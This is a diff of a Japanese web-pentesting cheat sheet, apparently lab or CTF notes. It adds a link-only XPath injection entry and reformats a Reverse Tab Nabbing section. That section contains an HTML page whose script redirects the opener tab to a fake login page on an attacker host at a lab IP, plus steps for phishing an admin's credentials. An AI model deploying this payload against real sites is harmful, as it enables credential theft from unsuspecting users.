@@ -304,33 +304,39 @@ $ git clone https://github.com/ticarpi/jwt_tool
 $ python3 -m pip install -r requirements.txt
 ```
 
+### XPATH インジェクション
+
+データ検索を DB からではなく、XML から行っている場合に有効な手法。
+
+https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html?highlight=xpath#xpath-injection
+
 ## その他
 
 ### Reverse Tab Nabbing
 
 https://book.hacktricks.wiki/en/pentesting-web/reverse-tab-nabbing.html
 
-target="_blank" が指定されており、かつ rel="noopener" または rel="noreferrer" が指定されていない場合、Reverse Tab Nabbing 攻撃が成立する可能性がある。
+target="\_blank" が指定されており、かつ rel="noopener" または rel="noreferrer" が指定されていない場合、Reverse Tab Nabbing 攻撃が成立する可能性がある。
 
 ```html
-<a href='http://10.2.22.182:8000/index.html' target='_blank' >Here</a>
+<a href="http://10.2.22.182:8000/index.html" target="_blank">Here</a>
 ```
 
-1. 現在のタブを開いた元のタブのLocationを（2で作成するページに）変更するHTMLページを用意する
+1. 現在のタブを開いた元のタブの Location を（2 で作成するページに）変更する HTML ページを用意する
 2. 攻撃対象サイトのログイン画面に似せたログインページを用意する
-3. adminがだまされてログイン情報を入力したら、その情報が攻撃者に送信される
+3. admin がだまされてログイン情報を入力したら、その情報が攻撃者に送信される
 
 ### アクセスさせるページ index.html
 
 ```html
 <!DOCTYPE html>
 <html>
- <body>
-  Welcome to my blog!
-  <script>
-  window.opener.location = "http://10.2.22.182:8000/login.php";
-  </script>
- </body>
+  <body>
+    Welcome to my blog!
+    <script>
+      window.opener.location = "http://10.2.22.182:8000/login.php";
+    </script>
+  </body>
 </html>
 ```
 
